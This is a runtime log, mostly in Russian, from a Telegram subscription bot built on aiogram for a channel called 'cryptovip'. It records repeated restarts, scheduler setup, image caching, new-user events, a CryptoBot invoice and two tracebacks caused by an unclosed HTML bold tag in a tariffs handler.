2026-05-21 21:28:02 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 21:28:02 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 21:28:02 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 21:28:07 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 21:29:17 | INFO     | __main__ | Запуск бота...
2026-05-21 21:29:17 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 21:29:17 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 21:29:17 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 21:29:17 | INFO     | __main__ | Запуск polling...
2026-05-21 21:29:17 | INFO     | database.db | База данных инициализирована
2026-05-21 21:29:17 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 21:29:17 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 21:29:17 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 21:29:17 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 21:29:18 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBmGoP...
2026-05-21 21:29:18 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 21:29:19 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 21:29:19 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 21:29:20 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 21:29:20 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 21:29:20 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 21:29:20 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 21:29:28 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 21:32:07 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 09:59:20 | INFO     | __main__ | Запуск бота...
2026-05-22 09:59:20 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 09:59:20 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 09:59:20 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 09:59:20 | INFO     | __main__ | Запуск polling...
2026-05-22 09:59:20 | INFO     | database.db | База данных инициализирована
2026-05-22 09:59:20 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 09:59:20 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 09:59:20 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 09:59:20 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 09:59:21 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBmGoP...
2026-05-22 09:59:21 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 09:59:22 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-22 09:59:22 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 09:59:22 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-22 09:59:22 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 09:59:22 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 09:59:23 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-22 10:00:11 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 10:13:00 | INFO     | __main__ | Запуск бота...
2026-05-22 10:13:00 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 10:13:00 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 10:13:00 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 10:13:00 | INFO     | __main__ | Запуск polling...
2026-05-22 10:13:00 | INFO     | database.db | База данных инициализирована
2026-05-22 10:13:00 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 10:13:00 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 10:13:00 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 10:13:00 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 10:13:07 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 10:13:07 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 10:13:08 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAMEahAC...
2026-05-22 10:13:08 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 10:13:09 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMFahAC...
2026-05-22 10:13:09 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 10:13:09 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 10:13:09 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 10:13:21 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 10:13:36 | ERROR    | aiogram.event | Cause exception while process update id=722784840 by bot id=8780899509
TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Can't find end tag corresponding to start tag "b"
Traceback (most recent call last):
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
           ^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
           ^^^^^^^^^^^^^^^
  File "C:\Users\User\Desktop\bot\handlers\tariffs.py", line 93, in show_tariffs
    await send_tariffs(bot, callback.from_user.id)
  File "C:\Users\User\Desktop\bot\handlers\tariffs.py", line 63, in send_tariffs
    msg = await bot.send_photo(
          ^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\bot.py", line 2978, in send_photo
    return await self(call, request_timeout=request_timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
               ^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Can't find end tag corresponding to start tag "b"
2026-05-22 10:13:47 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 10:13:49 | ERROR    | aiogram.event | Cause exception while process update id=722784843 by bot id=8780899509
TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Can't find end tag corresponding to start tag "b"
Traceback (most recent call last):
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
           ^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
           ^^^^^^^^^^^^^^^
  File "C:\Users\User\Desktop\bot\handlers\tariffs.py", line 93, in show_tariffs
    await send_tariffs(bot, callback.from_user.id)
  File "C:\Users\User\Desktop\bot\handlers\tariffs.py", line 63, in send_tariffs
    msg = await bot.send_photo(
          ^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\bot.py", line 2978, in send_photo
    return await self(call, request_timeout=request_timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
               ^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\User\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Can't find end tag corresponding to start tag "b"
2026-05-22 10:14:56 | INFO     | __main__ | Запуск бота...
2026-05-22 10:14:57 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 10:14:57 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 10:14:57 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 10:14:57 | INFO     | __main__ | Запуск polling...
2026-05-22 10:14:57 | INFO     | database.db | База данных инициализирована
2026-05-22 10:14:57 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 10:14:57 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 10:14:57 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 10:14:57 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 10:14:58 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 10:14:58 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 10:14:58 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAMEahAC...
2026-05-22 10:14:58 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 10:14:59 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMFahAC...
2026-05-22 10:14:59 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 10:14:59 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 10:14:59 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 10:15:03 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 10:45:28 | INFO     | handlers.start | Новый пользователь 1394034854 (@plategabottest)
2026-05-22 11:01:17 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 13:34:24 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramNetworkError: HTTP Client says - Request timeout error
2026-05-22 13:34:24 | WARNING  | aiogram.dispatcher | Sleep for 1.000000 seconds and try again... (tryings = 0, bot id = 8780899509)
2026-05-22 13:54:52 | INFO     | __main__ | Запуск бота...
2026-05-22 13:54:52 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 13:54:52 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 13:54:52 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 13:54:52 | INFO     | __main__ | Запуск polling...
2026-05-22 13:54:52 | INFO     | database.db | База данных инициализирована
2026-05-22 13:54:52 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 13:54:52 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 13:54:52 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 13:54:52 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 13:54:53 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 13:54:53 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 13:54:54 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAMEahAC...
2026-05-22 13:54:54 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 13:54:55 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMFahAC...
2026-05-22 13:54:55 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 13:54:55 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 13:54:55 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 13:55:02 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 13:56:15 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 52149236
2026-05-22 13:56:15 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=52149236
2026-05-22 14:04:27 | INFO     | __main__ | Запуск бота...
2026-05-22 14:04:27 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:04:27 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:04:27 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 14:04:27 | INFO     | __main__ | Запуск polling...
2026-05-22 14:04:27 | INFO     | database.db | База данных инициализирована
2026-05-22 14:04:27 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 14:04:27 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 14:04:27 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 14:04:27 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 14:04:28 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 14:04:28 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 14:04:29 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAMEahAC...
2026-05-22 14:04:29 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 14:04:30 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMFahAC...
2026-05-22 14:04:30 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 14:04:30 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 14:04:30 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 14:04:34 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 14:14:21 | INFO     | __main__ | Запуск бота...
2026-05-22 14:14:22 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:14:22 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:14:22 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 14:14:22 | INFO     | __main__ | Запуск polling...
2026-05-22 14:14:22 | INFO     | database.db | База данных инициализирована
2026-05-22 14:14:22 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 14:14:22 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 14:14:22 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 14:14:22 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 14:14:23 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 14:14:23 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 14:14:23 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAMEahAC...
2026-05-22 14:14:23 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 14:14:24 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMFahAC...
2026-05-22 14:14:24 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 14:14:24 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 14:14:24 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 14:14:33 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 14:19:33 | INFO     | __main__ | Запуск бота...
2026-05-22 14:19:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:19:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:19:34 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 14:19:34 | INFO     | __main__ | Запуск polling...
2026-05-22 14:19:34 | INFO     | database.db | База данных инициализирована
2026-05-22 14:19:34 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 14:19:34 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 14:19:34 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 14:19:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 14:19:34 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 14:19:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 14:19:35 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAMEahAC...
2026-05-22 14:19:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 14:19:35 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMFahAC...
2026-05-22 14:19:35 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 14:19:36 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 14:19:36 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 14:19:39 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 14:20:12 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 14:22:22 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 14:55:58 | INFO     | __main__ | Запуск бота...
2026-05-22 14:55:58 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:55:58 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:55:58 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 14:55:58 | INFO     | __main__ | Запуск polling...
2026-05-22 14:55:58 | INFO     | database.db | База данных инициализирована
2026-05-22 14:55:58 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 14:55:58 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 14:55:58 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 14:55:58 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 14:55:59 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 14:55:59 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 14:56:01 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 14:56:01 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 14:56:02 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 14:56:02 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 14:56:02 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 14:56:02 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 14:56:15 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 14:58:02 | INFO     | __main__ | Запуск бота...
2026-05-22 14:58:02 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 14:58:02 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
